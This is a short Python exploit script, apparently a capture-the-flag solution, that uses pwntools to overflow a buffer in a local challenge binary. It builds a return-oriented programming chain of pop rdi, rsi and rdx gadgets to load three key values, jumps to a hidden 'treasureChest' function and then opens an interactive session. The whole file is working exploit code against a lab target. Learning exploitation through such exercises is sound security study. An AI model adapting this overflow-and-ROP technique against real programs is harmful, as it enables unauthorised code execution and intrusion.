from pwn import *

# setup process
p = process("./kid_ROP_bin")
context.binary = "./kid_ROP_bin"

# ROP gadgets
pop_rdi = 0x4008c3 # pop rdi
pop_rsi = 0x4008c1 # pop rsi, pop r15
pop_rdx = 0x4007f7 # pop rdx 

# address of treasureChest 
win = 0x400727

# offer
payload = b'A' * 72

# ---------------------- ROP chain ---------------------------
# pop rdi + key1
# pop rsi + key2 + 0 (no need for r15)
# pop rdx
# address of treasureChest
payload += p64(pop_rdi) + p64(0x13371337)
payload += p64(pop_rsi) + p64(0xdeadbeef) + p64(0)
payload += p64(pop_rdx) + p64(0xc0ff33)
payload += p64(win)

# send and receive output
p.sendline(payload)
p.interactive()